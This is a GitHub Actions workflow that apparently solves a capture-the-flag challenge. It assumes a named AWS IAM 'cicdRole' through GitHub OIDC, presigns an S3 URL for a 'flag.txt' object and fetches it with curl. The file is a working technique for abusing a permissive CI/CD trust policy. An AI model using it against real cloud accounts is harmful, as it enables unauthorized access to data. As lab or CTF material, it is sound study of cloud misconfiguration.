name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Generate presigned URL and fetch flag immediately
        run: |
          URL=$(aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 60)
          echo "===== fetching flag via presigned URL ====="
          curl -si "$URL"
